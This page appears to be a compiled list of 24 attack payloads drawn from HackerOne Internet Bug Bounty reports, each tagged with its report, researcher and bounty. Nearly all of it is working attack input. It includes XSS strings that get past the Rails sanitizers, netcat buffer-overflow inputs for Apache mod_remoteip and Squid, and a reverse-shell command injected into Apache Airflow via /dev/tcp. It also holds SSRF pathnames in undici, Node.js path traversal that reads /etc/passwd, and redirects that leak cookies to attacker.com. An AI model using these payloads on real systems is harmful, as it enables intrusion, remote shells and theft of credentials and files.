# Internet Bug Bounty

24 payloads.

### `f112958f`

```
http://attacker.com/chromeFileUploadCrossDomain.swf?url=redirect.php?input=https://target.com/u/0/
```

**Parameter:** `url`
— [Flash Cross Domain Policy Bypass by Using File Upload and Redirection - only in Chrome](https://hackerone.com/reports/51265) · Internet Bug Bounty · [irsdl](https://hackerone.com/irsdl)

### `d351e96f`

```
http://attacker.com/chromeFileUploadCrossDomain.swf?url=http://target.com/demo/openredirect/redirect.php?target=https://evil.com/u/0/%26status=301
```

**Parameter:** `url`
— [Flash Cross Domain Policy Bypass by Using File Upload and Redirection - only in Chrome](https://hackerone.com/reports/51265) · Internet Bug Bounty · [irsdl](https://hackerone.com/irsdl)

### `56059ec1`

```
Prashanths-MacBook-Pro:~ prashanthvarma$ nc localhost 80
POST /lol.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:61.0) Gecko/20100101 Firefox/61.0
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Transfer-Encoding: chunked
Content-Length: 25

<script>alert(1)</script>HTTP/1.1 400 Bad Request
Date: Mon, 09 Jul 2018 06:08:22 GMT
Server: Apache/2.4.33 (Unix) PHP/7.1.17
Content-Length: 226
```

— [Improper handling of Chunked data request in sapi_apache2.c leads to Reflected XSS](https://hackerone.com/reports/409986) · Internet Bug Bounty · [cymtrick](https://hackerone.com/cymtrick) · $500.0

### `c6ff84cc`

```
printf "PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n" | nc localhost 6666
```

— [mod_remoteip stack buffer overflow and NULL pointer dereference](https://hackerone.com/reports/674540) · Internet Bug Bounty · [ccppuu](https://hackerone.com/ccppuu)

### `915acb04`

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x21\x32\x08\x6f\x6faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc localhost 6666
```

— [mod_remoteip stack buffer overflow and NULL pointer dereference](https://hackerone.com/reports/674540) · Internet Bug Bounty · [ccppuu](https://hackerone.com/ccppuu)

### `ddfaa60b`

```
printf "PROXY aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n" | nc localhost 6666
```

— [mod_remoteip stack buffer overflow and NULL pointer dereference](https://hackerone.com/reports/674540) · Internet Bug Bounty · [ccppuu](https://hackerone.com/ccppuu)

### `8d4e32aa`

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x20\x11\x00\x00" | nc localhost 6666
```

— [mod_remoteip stack buffer overflow and NULL pointer dereference](https://hackerone.com/reports/674540) · Internet Bug Bounty · [ccppuu](https://hackerone.com/ccppuu)

### `eeb5e02e`

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x21\x00\x00\x00" | nc localhost 6666
```

— [mod_remoteip stack buffer overflow and NULL pointer dereference](https://hackerone.com/reports/674540) · Internet Bug Bounty · [ccppuu](https://hackerone.com/ccppuu)

### `6e450440`

```
./squid -N -f squid.conf & sleep 1 && echo -en "GET / HTTP/1.1\x0D\x0AHost: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:\x0D\x0A\x0D\x0A" | nc 
```

**Parameter:** `Host`
— [Squid as reverse proxy RCE and data leak](https://hackerone.com/reports/778610) · Internet Bug Bounty · [guido](https://hackerone.com/guido)

### `39aaf3be`

```
{"foo":"\";bash -i >& /dev/tcp/192.168.3.7/6666 0>&1;\""}
```

**Parameter:** `foo`
— [CVE-2022-24288: Apache Airflow: TWO RCEs in example DAGs](https://hackerone.com/reports/1492896) · Internet Bug Bounty · [x_h1](https://hackerone.com/x_h1)

### `dba40ea4`

```
<select><style><script>alert(1)</script></style></select>
```

— [Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag](https://hackerone.com/reports/1599573) · Internet Bug Bounty · [windshock](https://hackerone.com/windshock) · $2,400.0

### `c1715f56`

```
//127.0.0.1
```

**Parameter:** `pathname`
— [\[CVE-2022-35949\]: undici.request vulnerable to SSRF using absolute / protocol-relative URL on pathname ](https://hackerone.com/reports/1663788) · Internet Bug Bounty · [haxatron1](https://hackerone.com/haxatron1)

### `faa6d816`

```
http://target.com//127.0.0.1
```

**Parameter:** `pathname`
— [\[CVE-2022-35949\]: undici.request vulnerable to SSRF using absolute / protocol-relative URL on pathname ](https://hackerone.com/reports/1663788) · Internet Bug Bounty · [haxatron1](https://hackerone.com/haxatron1)

### `61ca117d`

```
http://target.com/http://127.0.0.1
```

**Parameter:** `pathname`
— [\[CVE-2022-35949\]: undici.request vulnerable to SSRF using absolute / protocol-relative URL on pathname ](https://hackerone.com/reports/1663788) · Internet Bug Bounty · [haxatron1](https://hackerone.com/haxatron1)

### `bc0a97fe`

```
<svg id='x' xmlns='http://target.com/2000/svg' xmlns:xlink='http://target.com/1999/xlink' width='1337' height='1337'>
<image href="1" onerror="alert(window.origin)" />
</svg>
```

— [Rails ActionView sanitize helper bypass leading to XSS using SVG tag.](https://hackerone.com/reports/1805873) · Internet Bug Bounty · [haqpl](https://hackerone.com/haqpl) · $2,400.0

### `5d9abc7a`

```
https://target.com/cloudsql-proxy/../swordlight/load_my_evil_dag.py?a=/cloud_sql_proxy.linux.amd64
```

— [CVE-2023-25692: Apache Airflow Google Provider: Google Cloud Sql Provider Denial Of Service and Remote Command Execution](https://hackerone.com/reports/1895316) · Internet Bug Bounty · [sw0rd1ight](https://hackerone.com/sw0rd1ight) · $480.0

### `f0da5cb0`

```
$ node --experimental-permission --allow-fs-read=/tmp/ -p "path.resolve = (s) => s; fs.readFileSync('/tmp/../etc/passwd')"
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f ... 3174 more bytes>
```

— [Permission model improperly protects against path traversal in Node.js 20](https://hackerone.com/reports/2225660) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $2,330.0

### `afa2f654`

```
import { request } from 'undici'
const {
  statusCode,
  headers,
  trailers,
  body
} = await request('http://target.com/redirect.php?url=http://attacker:8182',{
        maxRedirections: 3,
        headers: {
            autHorization: 'test',
	    cookie: "ddd=dddd"
        }})

console.log('response received', statusCode)
console.log('headers', headers)

for await (const data of body) {
  console.log('data', data)
}
```

**Parameter:** `url`
— [Cookie headers are not cleared in cross-domain redirect in undici-fetch](https://hackerone.com/reports/2243710) · Internet Bug Bounty · [ranjit_p](https://hackerone.com/ranjit_p) · $405.0

### `5b973b6b`

```
import { fetch } from 'undici'

const res = await fetch('http://target.com/redirect.php?url=http://attacker.com:8182/vvv',{
        maxRedirections: 3,
        headers: {
            AutHorization: 'test',
            Cookie: "ddd=dddd"
        }})
const json = await res.json()
console.log(json)
```

**Parameter:** `url`
— [Cookie headers are not cleared in cross-domain redirect in undici-fetch](https://hackerone.com/reports/2243710) · Internet Bug Bounty · [ranjit_p](https://hackerone.com/ranjit_p) · $405.0

### `1a584a69`

```
$ node --experimental-permission \
        --allow-fs-read=/tmp/ \
        -p 'fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))'
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a 4e ... 2103 more bytes>
```

— [Path traversal through path stored in Uint8Array in Node.js 20](https://hackerone.com/reports/2256167) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $3,495.0

### `42c68f0e`

```
/exploit/etc/passwd
```

— [Path traversal by monkey-patching Buffer internals](https://hackerone.com/reports/2434811) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $2,430.0

### `604f8c66`

```
/tmp/../etc/passwd
```

— [Path traversal by monkey-patching Buffer internals](https://hackerone.com/reports/2434811) · Internet Bug Bounty · [tniessen](https://hackerone.com/tniessen) · $2,430.0

### `0548b5c6`

```
POST /api/v1/datasets/events HTTP/1.1
Host: 192.168.168.129:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://192.168.168.129:8080/datasets?uri=s3%3A%2F%2Foutput%2F1.txt
Cookie: session=<authen-cookie>
Content-Type: application/json
Content-Length: 62

{"dataset_uri":"s3://output/1.txt","extra":{"hi
```

**Parameter:** `extra`
— [CVE-2024-45498: Apache Airflow Command injection in read_dataset_event_from_classic DAG](https://hackerone.com/reports/2705661) · Internet Bug Bounty · [nhienit2010](https://hackerone.com/nhienit2010)

### `7fdff144`

```
<%= sanitize '<noscript><p id="</noscript><script>alert(1)</script>"></noscript>' %>
```

— [ActionView sanitize helper bypass with noscript](https://hackerone.com/reports/2931691) · Internet Bug Bounty · [taise](https://hackerone.com/taise)
